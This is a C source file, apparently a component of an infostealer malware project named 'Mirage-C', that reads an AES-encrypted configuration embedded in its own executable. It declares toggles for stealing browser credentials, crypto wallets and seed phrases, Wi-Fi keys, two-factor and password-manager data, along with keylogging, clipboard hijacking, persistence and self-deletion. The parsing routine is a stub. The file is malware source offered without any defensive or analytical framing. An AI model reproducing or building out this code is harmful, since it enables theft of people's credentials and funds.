/*
 * config_rt.c — Runtime config reader for Mirage-C
 *
 * Reads the MIRAGECFG marker from the own PE image, decrypts the
 * AES-256-GCM config blob, and populates g_cfg_* globals.
 *
 * Stub: full JSON parsing pending. Currently sets g_cfg_loaded=0
 * which causes ENABLED() macros to fall through to compile-time #ifdef.
 */

#include "config.h"
#include <string.h>

/* Runtime config globals */
int g_cfg_loaded = 0;

int g_cfg_chromium = -1;
int g_cfg_firefox = -1;
int g_cfg_wallets = -1;
int g_cfg_wifi = -1;
int g_cfg_screenshot = -1;
int g_cfg_clipboard = -1;
int g_cfg_keylogger = -1;
int g_cfg_seed_grabber = -1;
int g_cfg_clipper = -1;
int g_cfg_gaming = -1;
int g_cfg_vpn = -1;
int g_cfg_twofa = -1;
int g_cfg_passman = -1;
int g_cfg_persistence = -1;
int g_cfg_self_delete = -1;
int g_cfg_cdp_grab = -1;
int g_cfg_raw_export = -1;
int g_cfg_kill_browsers = -1;
int g_cfg_anti_duplicate = -1;

int config_parse_runtime(void) {
    g_cfg_loaded = 0;
    return 0;
}
